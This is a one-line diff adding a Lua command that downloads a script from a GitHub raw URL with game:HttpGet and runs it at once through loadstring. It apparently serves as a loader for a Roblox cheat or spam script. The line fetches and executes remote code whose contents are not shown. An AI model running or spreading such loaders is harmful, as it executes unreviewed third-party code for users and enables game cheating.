@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/scrooms-spam6-93dlpb5olq4fjs.lua"))()
